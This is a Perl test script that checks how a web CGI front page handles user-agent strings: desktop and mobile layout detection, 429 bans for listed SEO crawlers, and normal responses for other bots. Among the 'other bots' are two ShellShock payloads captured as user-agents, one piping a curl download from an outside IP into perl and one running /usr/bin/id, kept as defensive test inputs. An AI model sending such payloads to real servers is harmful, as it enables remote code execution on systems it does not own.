#!/usr/bin/perl -w
#
#  Test user-agent handling
#
#  We use the user-agent to determine the initial layout configuration.
#  In addition, we ban badly-behaving bots depending on their name.
#

use c2systest;
use c2cgitest;

# Things that look like desktop browsers.
my @DESKTOP = (
    '-',
    'Chrome/18.3 (Nokia 3.8; sq_AL;)',                                                     # probably mobile?
    'Konqueror/20.12 (AmigaOS 4.7; be_BY;)',
    'Links (2.8; Linux 3.16.0-042stab134.3 x86_64; GNU C 4.9.1; text)',
    'Lynx/2.8.9dev.8 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/3.4.9',
    'Mozilla Firefox Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0',
    'Mozilla/2.0 (compatible; MSIE 3.02; Windows CE; 240x320)',                            # probably mobile?
    'Mozilla/4.0 (compatible; MSIE 4.01; Digital AlphaServer 1000A 4/233; Windows NT; Powered By 64-Bit Alpha Processor)',
    'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)',
    'Mozilla/4.05 (Macintosh; I; 68K Nav)',
    'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-T800 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:62.0) Gecko/20100101 Firefox/62.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4',
    'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr) AppleWebKit/416.12 (KHTML, like Gecko) Safari/416.13_Adobe',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 YaBrowser/18.4.1.871 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.58',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; APCPMS=^N201302070257035267484A37ACF0A41BE63F_2704^; Trident/7.0; rv:11.0) like Gecko,gzip(gfe)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 10452.99.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.203 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/66.0.3359.117 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; Touch; MASMJS)',
    'Mozilla/5.0 Mozilla/5.0 (Windows NT 5.1; rv:15.0) Gecko/20140810 Firefox/15.0',
    'Opera/8.00 (Windows NT 5.1; U; en)',
    'Opera/8.01 (J2ME/MIDP; Opera Mini/1.2.3214/1724; ru; U; ssr)',
    'Opera/9.80 (Windows NT 5.1; U; Edition Yx; ru) Presto/2.10.229 Version/11.64',
    'Opera/9.80 (iPad; Opera Mini/16.0.9/95.90; U; nb) Presto/2.12.423 Version/12.16',     # probably mobile?
    'Safari/13604.5.6 CFNetwork/893.13.1 Darwin/17.4.0 (x86_64)',
    );

# Things that look like mobile browsers.
my @MOBILE = (
    'MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mobile/2.12 (Arch Linux 5.9; sq_AL;)',
    'MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0',
    'Mozilla/5.0 (Android 4.4; Mobile; rv:63.0) Gecko/63.0 Firefox/63.0',
    'Mozilla/5.0 (Android 7.1.1; Mobile; rv:60.0) Gecko/60.0 Firefox/60.0',
    'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; de) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.714 Mobile Safari/534.11+',
    'Mozilla/5.0 (Linux; Android 4.1.2; SHV-E250S Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.5400.423 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.4199.826 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; PRA-LX1 Build/HUAWEIPRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.P1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36',
    'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 630 Dual SIM) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
    'Mozilla/5.0 (iPad; CPU OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 12_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16C50 [FBAN/FBIOS;FBAV/202.0.0.55.99;FBBV/135472877;FBDV/iPad5,3;FBMD/iPad;FBSN/iOS;FBSV/12.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/nl_NL;FBOP/5;FBRV/0]',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.9076.362 Mobile Safari/537.36',
    'Opera/9.80 (Windows Mobile; WCE; Opera Mobi/WMD-50430; U; ru) Presto/2.4.13 Version/10.00',
    'iCabMobile/9.3.3 CFNetwork/758.3.15 Darwin/15.4.0',
    );

# Bad bots.
# Those are banned for sending too many requests with no noticeable benefit.
# Statistics over 2269828 requests Q2/2018 - Q1/2019
my @BAD_BOTS = (
    'BUbiNG (+http://law.di.unimi.it/BUbiNG.html#wc)',                                  # almost gone after Q2/2018
    'MauiBot (crawler.feedback+wc@gmail.com)',                                          # almost gone after Q2/2018; 22k in week 14/2018
    'Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)',               # 141193 = 6%
    'Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)',               #  41536 = 2%
    'Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)',              # 264203 = 12%
    'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',                    #  57249 = 2.5%
    'Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)',    #  17713 = 0.8%
    'Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)',      # 282105 = 12%
    );

# Other bots.
# I don't care what they get but it should be correct.
my @MISC_BOTS = (
    '() { :; }; curl http://202.28.77.53/~prajaks/310482/index.png | perl',             # ShellShock
    '() { uniscan; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id',      # ShellShock
    ';b:1;}\x/0\x*-\x),\x)&',
    'Googlebot-Image/1.0',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'PycURL/7.43.0 libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3',
    'c2monitor',                                                                        # special handling
    'ia_archiver',
    );

# Test desktop browsers.
# A: request index.cgi with a desktop user-agent.
# E: must receive correct response in desktop layout.
test 'web/15_ua/desktop', sub {
    my $setup = shift;
    prepare($setup);
    foreach (@DESKTOP) {
        my $result = load_index($setup, $_);
        assert_starts_with $result->{headers}{status}, 200;
        assert_contains $result->{text}, 'class="desktop"';
    }
};

# Test mobile browsers.
# A: request index.cgi with a mobile user-agent.
# E: must receive correct response in mobile layout.
test 'web/15_ua/mobile', sub {
    my $setup = shift;
    prepare($setup);
    foreach (@MOBILE) {
        my $result = load_index($setup, $_);
        assert_starts_with $result->{headers}{status}, 200;
        assert_contains $result->{text}, 'class="mobile"';
    }
};

# Test bad bots.
# A: request index.cgi with a bad bot user-agent.
# E: must receive 429 response.
test 'web/15_ua/bad', sub {
    my $setup = shift;
    prepare($setup);
    foreach (@BAD_BOTS) {
        my $result = load_index($setup, $_);
        assert_starts_with $result->{headers}{status}, 429;
        assert length($result->{text}) < 2000;
    }
};

# Test good bots.
# A: request index.cgi with a good bot user-agent.
# E: must receive success response.
test 'web/15_ua/good', sub {
    my $setup = shift;
    prepare($setup);
    foreach (@MISC_BOTS) {
        my $result = load_index($setup, $_);
        assert_starts_with $result->{headers}{status}, 200;
    }
};




sub prepare {
    my $setup = shift;
    setup_add_db($setup);
    setup_add_usermgr($setup);
    setup_start_wait($setup);
}

sub load_index {
    my $setup = shift;
    my $ua = shift;
    
    my $cgi = cgi_new($setup, 'index.cgi');
    cgi_set_ua($cgi, $ua);
    my $result = cgi_run($cgi);

    $result->{text} =~ s/\s+\"/\"/g;                             # Make sure we recognize 'class="desktop"' and 'class="desktop "'
    $result;
}
